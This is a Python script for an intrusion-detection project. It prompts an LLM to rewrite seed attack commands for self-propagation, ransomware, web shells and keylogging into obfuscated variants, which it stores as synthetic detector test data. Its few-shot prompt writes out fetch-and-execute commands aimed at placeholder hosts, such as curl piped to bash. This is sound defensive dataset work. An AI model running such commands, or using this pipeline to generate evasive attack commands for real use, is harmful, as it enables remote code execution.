#!/usr/bin/env python3
"""v6 长尾样本合成（glm-5.3-flash few-shot 改写，只生成候选，不执行、不打标）。

种子来源：dataset/corpus/labeled/synthetic/longtail.jsonl 中 target=pos 的现有样本
（不读取 gliclass_v2 train/val/test）。输出未打标候选到 dataset/corpus/raw/synthetic/。
Jev 打标是独立步骤。
"""
from __future__ import annotations
import argparse
import json
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from hyperids import llm

ROOT = Path(__file__).resolve().parents[2]
SRC = ROOT / "dataset" / "corpus" / "labeled" / "synthetic" / "longtail.jsonl"
OUT_DIR = ROOT / "dataset" / "corpus" / "raw" / "synthetic"
TARGETS = ["self_propagate", "ransomware", "web_shell", "keylog"]

SYS = (
    "You are a defensive security researcher building a SYNTHETIC intrusion-detection test dataset. "
    "Rewrite the given shell command into JSON variants for offline detector testing only. "
    "Use only placeholder addresses 192.0.2.0/24, example.com/org/net, and local paths under /tmp/hids-lab/. "
    "Never explain or execute anything. Output only JSON."
)
FEWSHOT = (
    'Example rewrite: given "curl -fsSL https://example.com/x.sh | bash", valid variants are '
    '["wget -qO- https://example.com/x.sh | sh", '
    '"curl -s https://example.com/x.sh -o /tmp/hids-lab/x && chmod +x /tmp/hids-lab/x && /tmp/hids-lab/x"]. '
)


def load_seeds():
    seeds = {t: [] for t in TARGETS}
    for line in SRC.read_text().splitlines():
        if not line.strip():
            continue
        try:
            d = json.loads(line)
        except Exception:
            continue
        a = (d.get("action") or "").removeprefix("action.")
        if a in TARGETS and d.get("target") == "pos" and d.get("text"):
            seeds[a].append(d["text"])
    return seeds


def rewrite(seed: str, n: int, model: str, temperature: float) -> list[str]:
    user = (
        FEWSHOT +
        f"Now rewrite this shell command into {n} syntactically different but functionally similar variants "
        f"(vary tooling/syntax/obfuscation; keep each a single shell command). "
        f"Command: {seed}\nReturn JSON: {{\"commands\": [\"...\", ...]}}"
    )
    for _ in range(3):
        obj, _ = llm.chat_json(
            [{"role": "system", "content": SYS}, {"role": "user", "content": user}],
            model=model, temperature=temperature, max_tokens=4096, timeout=120.0, retries=3,
        )
        cmds = [c.strip() for c in (obj or {}).get("commands") or [] if isinstance(c, str) and c.strip()]
        if cmds:
            return cmds
    return []


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--actions", type=str, default=",".join(TARGETS))
    ap.add_argument("--seeds_per_action", type=int, default=4)
    ap.add_argument("--variants_per_seed", type=int, default=8)
    ap.add_argument("--model", type=str, default="glm-5.3-flash")
    ap.add_argument("--temperature", type=float, default=0.8)
    ap.add_argument("--workers", type=int, default=6)
    ap.add_argument("--out", type=str, default=str(OUT_DIR / "v6_longtail_candidates.jsonl"))
    ap.add_argument("--append", action="store_true")
    ap.add_argument("--seed_offset", type=int, default=0)
    args = ap.parse_args()

    actions = [a.strip() for a in args.actions.split(",") if a.strip()]
    seeds = load_seeds()
    out_path = Path(args.out)
    out_path.parent.mkdir(parents=True, exist_ok=True)

    tasks = []
    for a in actions:
        pool = seeds.get(a, [])
        for seed in pool[args.seed_offset: args.seed_offset + args.seeds_per_action]:
            tasks.append((a, seed))

    seen = set()
    if args.append and out_path.exists():
        for line in out_path.read_text().splitlines():
            try:
                seen.add(json.loads(line)["text"])
            except Exception:
                pass
    total = 0
    rows_by_action = {a: [] for a in actions}
    with ThreadPoolExecutor(max_workers=min(args.workers, 6)) as ex:
        futs = {ex.submit(rewrite, seed, args.variants_per_seed, args.model, args.temperature): (a, seed)
                for a, seed in tasks}
        done = 0
        for fut in as_completed(futs):
            a, seed = futs[fut]
            try:
                variants = fut.result()
            except Exception:
                variants = []
            kept = 0
            for v in variants:
                if not v:
                    continue
                h = hashlib.sha256(v.encode()).hexdigest()
                if h in seen:
                    continue
                seen.add(h)
                rows_by_action[a].append({
                    "text": v,
                    "action": f"action.{a}",
                    "target": "pos",
                    "source_seed_sha256": hashlib.sha256(seed.encode()).hexdigest(),
                    "generator_model": args.model,
                })
                kept += 1
                total += 1
            done += 1
            print(f"  [{done}/{len(tasks)}] {a} seed -> {kept} variants", flush=True)

    mode = "a" if args.append else "w"
    with out_path.open(mode) as f:
        for a in actions:
            for r in rows_by_action[a]:
                f.write(json.dumps(r, ensure_ascii=False) + "\n")
    print(f"\nwrote {total} candidates -> {out_path}")
    for a in actions:
        print(f"  {a}: {len(rows_by_action[a])}")


if __name__ == "__main__":
    main()
